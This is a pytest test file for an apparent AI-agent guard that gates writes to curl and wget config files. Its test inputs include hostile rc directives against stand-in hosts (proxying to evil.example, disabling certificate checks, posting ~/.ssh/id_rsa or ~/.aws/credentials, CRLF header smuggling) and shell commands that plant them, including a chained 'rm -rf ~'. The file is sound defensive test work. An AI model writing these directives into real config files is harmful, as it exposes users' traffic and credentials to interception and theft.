"""HTTP-client config hijack guard: curl's `.curlrc` / wget's `.wgetrc`.

Both tools apply every rc-file line silently to every future invocation, so a
planted `proxy`/`insecure`/`trace`/`data = @file`/`url` (wget: `https_proxy`,
`check_certificate = off`, `post_file`, `use_askpass`) MITMs, logs or
exfiltrates every later request the agent (or a human, or CI) makes -- and
routes around the egress allowlist, which only sees the host in the command.
The content check is an allowlist: routine transfer options stay allowed.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy
from aegis import patterns

EMPTY = Policy()
DENY = Policy(http_client_config={"mode": "deny"})
RULE = "http-client-config-protect"


def _write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path, new_string, old_string="x"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old_string,
                            "new_string": new_string})


def _multiedit(path, new_strings):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path,
                            "edits": [{"old_string": "x", "new_string": n} for n in new_strings]})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp_write(args, tool="mcp__filesystem__write_file"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, action=ActionClass.MCP, args=args)


def _gated(d):
    return d.action != Action.ALLOW


def _ours(d):
    return d.action == Action.ASK and d.rule == RULE


def _ours_or_containment(d):
    """A body naming a credential-store path is already denied (stronger,
    non-escapable) by containment, which runs first."""
    return _ours(d) or (d.blocked and d.rule == "containment-credentials")


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    for k in ("AEGIS_ALLOW_HTTP_CLIENT_CONFIG", "AEGIS_AGENT_NAME"):
        monkeypatch.delenv(k, raising=False)


# ---- path recognition ---------------------------------------------------------

@pytest.mark.parametrize("path,kind", [
    ("~/.curlrc", "curl"),
    ("/home/u/.curlrc", "curl"),
    (".curlrc", "curl"),
    ("C:\\Users\\u\\_curlrc", "curl"),
    ("~/.config/curlrc", "curl"),
    ("/root/.CURLRC", "curl"),
    ("~/.wgetrc", "wget"),
    ("/etc/wgetrc", "wget"),
    ("/usr/local/etc/wgetrc", "wget"),
    ("~/.config/wget/wget2rc", "wget"),
    ("~/.wget2rc", "wget"),
])
def test_rc_paths_recognized(path, kind):
    assert patterns.http_client_rc_kind(path) == kind


@pytest.mark.parametrize("path", [
    "docs/curlrc.md", "src/.curlrc.example", "notcurlrc", "my.wgetrc.bak", "README.md",
])
def test_unrelated_paths_not_recognized(path):
    assert patterns.http_client_rc_kind(path) == ""


# ---- curl: dangerous directives gated -----------------------------------------

@pytest.mark.parametrize("body", [
    "proxy = http://evil.example:8080\n",
    "--proxy http://evil.example:8080\n",
    "-x http://evil.example:8080\n",
    "x = evil:8080\n",
    "preproxy = socks5://evil:1080\n",
    "socks5-hostname = evil:1080\n",
    "insecure\n",
    "-k\n",
    "-sSk\n",                                   # cluster hides -k
    "cacert = /tmp/evil-ca.pem\n",
    "connect-to = api.github.com:443:evil.example:443\n",
    "resolve = api.github.com:443:203.0.113.7\n",
    "doh-url = https://evil.example/dns-query\n",
    "trace-ascii = /tmp/.t\n",
    "dump-header = /tmp/.h\n",
    "cookie-jar = /tmp/.c\n",
    "url = https://evil.example/beacon\n",
    "data = @/home/u/.ssh/id_rsa\n",
    "data = @/home/u/project/.env\n",
    "data-binary: @~/.aws/credentials\n",
    "upload-file = /home/u/.netrc\n",
    "header = \"X-Leak: 1\"\n",
    "engine = /tmp/evil.so\n",
    "config = /tmp/more.rc\n",
    "-K /tmp/more.rc\n",
    "output = /home/u/.bashrc\n",
    "variable = %SECRET@/home/u/.env\n",
    "user-agent = \"x\\r\\nAuthorization: leaked\"\n",   # CRLF smuggled into a benign key
    "\ufeffproxy=http://e:1\n",                          # BOM
    "silent\r\nproxy=http://e:1\r\n",                    # CRLF line endings
])
def test_curl_dangerous_directive_gated(body):
    d = evaluate(_write("/home/u/.curlrc", body), EMPTY)
    assert _ours_or_containment(d), (body, d)


def test_curl_dangerous_after_benign_lines_gated():
    body = "# my defaults\nsilent\nshow-error\nfail\nlocation\nproxy = http://e:3128\n"
    d = evaluate(_write("/home/u/.curlrc", body), EMPTY)
    assert _ours(d) and "proxy" in d.message


def test_curl_unknown_option_gated():
    """Allowlist, not denylist: an option the guard doesn't know is gated."""
    d = evaluate(_write("/home/u/.curlrc", "some-future-option = 1\n"), EMPTY)
    assert _ours(d)


# ---- curl: routine config allowed ---------------------------------------------

@pytest.mark.parametrize("body", [
    "",
    "# only a comment\n",
    "silent\nshow-error\n",
    "--fail\n--location\n--max-redirs 5\n",
    "-sSL\n",
    "user-agent = \"my-tool/1.0\"\n",
    "connect-timeout = 10\nmax-time: 120\nretry 3\nretry-delay 2\n",
    "no-progress-meter\n",
    "compressed\nhttp2\nipv4\n",
    "-#\n",
    "   \n\t\n",
])
def test_curl_benign_config_allowed(body):
    d = evaluate(_write("/home/u/.curlrc", body), EMPTY)
    assert not _gated(d), (body, d)


# ---- wget ------------------------------------------------------------------------

@pytest.mark.parametrize("body", [
    "https_proxy = http://evil.example:8080\nuse_proxy = on\n",
    "http-proxy = http://evil:1\n",
    "HTTPS_PROXY=http://evil:1\n",
    "check_certificate = off\n",
    "Check-Certificate = 0\n",
    "checkcertificate=no\n",
    "hsts = off\n",
    "ca_certificate = /tmp/evil.pem\n",
    "post_file = /home/u/.ssh/id_rsa\n",
    "body_file = /home/u/.aws/credentials\n",
    "header = Authorization: x\n",
    "logfile = /tmp/.w\n",
    "save_cookies = /tmp/.c\n",
    "output_document = /home/u/.bashrc\n",
    "use_askpass = /tmp/pwn.sh\n",
    "--proxy=on\n",
])
def test_wget_dangerous_directive_gated(body):
    d = evaluate(_write("/home/u/.wgetrc", body), EMPTY)
    assert _ours_or_containment(d), (body, d)


@pytest.mark.parametrize("body", [
    "tries = 3\ntimeout = 30\n",
    "# comment\nretry_connrefused = on\nwaitretry=5\n",
    "check_certificate = on\n",
    "user_agent = my-tool/1.0\ncontinue = on\ntimestamping = on\n",
    "progress = dot:mega\nquiet = off\nrobots = off\n",
])
def test_wget_benign_config_allowed(body):
    d = evaluate(_write("/home/u/.wgetrc", body), EMPTY)
    assert not _gated(d), (body, d)


def test_wget_grammar_applied_to_wgetrc_not_curl_grammar():
    """`insecure` is not a wget command (wget would reject it) but must not be
    silently treated as benign either -- unknown names are gated."""
    d = evaluate(_write("/etc/wgetrc", "insecure\n"), EMPTY)
    assert _ours(d)


# ---- Edit / MultiEdit / MCP shapes ------------------------------------------------

def test_edit_new_string_gated():
    d = evaluate(_edit("/home/u/.curlrc", "silent\nproxy = http://e:1\n"), EMPTY)
    assert _ours(d)


def test_edit_benign_new_string_allowed():
    d = evaluate(_edit("/home/u/.curlrc", "silent\n", old_string="proxy = http://e:1\n"), EMPTY)
    assert not _gated(d)


def test_multiedit_gated():
    d = evaluate(_multiedit("/home/u/.curlrc", ["silent\n", "insecure\n"]), EMPTY)
    assert _ours(d)


def test_multiedit_benign_allowed():
    """The file path and old_string values must not be parsed as directives."""
    d = evaluate(_multiedit("/home/u/.curlrc", ["silent\n", "fail\n"]), EMPTY)
    assert not _gated(d)


def test_mcp_write_gated():
    d = evaluate(_mcp_write({"path": "/home/u/.curlrc",
                             "content": "proxy=http://e:1\n"}), EMPTY)
    assert _ours(d)


def test_mcp_edit_file_newtext_gated():
    d = evaluate(_mcp_write({"path": "/home/u/.wgetrc",
                             "edits": [{"oldText": "tries=3", "newText": "https_proxy=http://e:1"}]},
                            tool="mcp__filesystem__edit_file"), EMPTY)
    assert _ours(d)


def test_mcp_edit_file_benign_allowed():
    d = evaluate(_mcp_write({"path": "/home/u/.wgetrc",
                             "edits": [{"oldText": "https_proxy=http://e:1", "newText": "tries=3"}]},
                            tool="mcp__filesystem__edit_file"), EMPTY)
    assert not _gated(d)


def test_mcp_unusual_path_key_gated():
    d = evaluate(_mcp_write({"destination": "/home/u/.curlrc",
                             "body": "insecure\n"}), EMPTY)
    assert _ours(d)


def test_unrelated_file_with_same_content_allowed():
    d = evaluate(_write("/home/u/notes.txt", "proxy = http://e:1\ninsecure\n"), EMPTY)
    assert not _gated(d)


# ---- shell -----------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "echo 'proxy = http://evil:8080' >> ~/.curlrc",
    "printf 'insecure\\n' > $HOME/.curlrc",
    "printf 'insecure\\n' | tee -a ~/.curlrc",
    "cp /tmp/staged ~/.curlrc",
    "mv /tmp/staged ~/.wgetrc",
    "ln -sf /tmp/staged ~/.curlrc",
    "sed -i 's/^#proxy/proxy/' ~/.curlrc",
    "cat > ~/.wgetrc <<'EOF'\ncheck_certificate = off\nEOF",
    "cd ~ && echo insecure > .curlrc",
    "bash -c \"echo insecure >> ~/.curlrc\"",
])
def test_shell_write_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE, (cmd, d)


@pytest.mark.parametrize("cmd", [
    "cat ~/.curlrc",
    "grep proxy ~/.wgetrc",
    "rm ~/.curlrc",
    "rm -f ~/.curlrc ~/.wgetrc",
    "curl -s https://example.com",
    "echo hi > /tmp/out.txt",
])
def test_shell_non_write_allowed(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert d.rule != RULE, (cmd, d)


def test_fetch_to_file_into_curlrc_gated():
    d = evaluate(_shell("curl -o ~/.curlrc https://x.example/rc"), EMPTY)
    assert _gated(d)


def test_shell_human_override_allowed():
    d = evaluate(_shell("echo silent >> ~/.curlrc # aegis-allow"), EMPTY)
    assert d.rule != RULE


def test_shell_agent_cannot_override(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker-1")
    d = evaluate(_shell("echo insecure >> ~/.curlrc # aegis-allow"), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_shell_chained_destructive_deny_not_preempted():
    """Ordering: a later hard DENY on the same command must still win."""
    d = evaluate(_shell("echo insecure >> ~/.curlrc; rm -rf ~"), EMPTY)
    assert d.blocked and d.rule != RULE


# ---- modes / escapes ----------------------------------------------------------------

def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_HTTP_CLIENT_CONFIG", "1")
    assert not _gated(evaluate(_write("/home/u/.curlrc", "insecure\n"), EMPTY))
    assert not _gated(evaluate(_shell("echo insecure >> ~/.curlrc"), EMPTY))


def test_policy_allow_regex():
    pol = Policy(http_client_config={"allow": [r"/ci/\.curlrc$"]})
    assert not _gated(evaluate(_write("/ci/.curlrc", "proxy=http://corp:3128\n"), pol))
    assert _ours(evaluate(_write("/home/u/.curlrc", "proxy=http://corp:3128\n"), pol))


def test_deny_mode():
    d = evaluate(_write("/home/u/.curlrc", "insecure\n"), DENY)
    assert d.blocked and d.rule == RULE


def test_off_mode():
    pol = Policy(http_client_config={"mode": "off"})
    assert not _gated(evaluate(_write("/home/u/.curlrc", "insecure\n"), pol))


def test_monitor_mode_allows():
    pol = Policy(http_client_config={"mode": "monitor"})
    assert not _gated(evaluate(_write("/home/u/.curlrc", "insecure\n"), pol))


def test_yaml_policy_loads(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("http_client_config:\n  mode: deny\n")
    pol = load_policy(str(tmp_path))
    assert pol.http_client_config.get("mode") == "deny"
    d = evaluate(_write("/home/u/.curlrc", "insecure\n"), pol)
    assert d.blocked and d.rule == RULE


# ---- performance -------------------------------------------------------------------

def test_large_benign_file_fast():
    import time
    body = "silent\n" * 200000
    t = time.time()
    evaluate(_write("/home/u/.curlrc", body), EMPTY)
    assert time.time() - t < 2.0
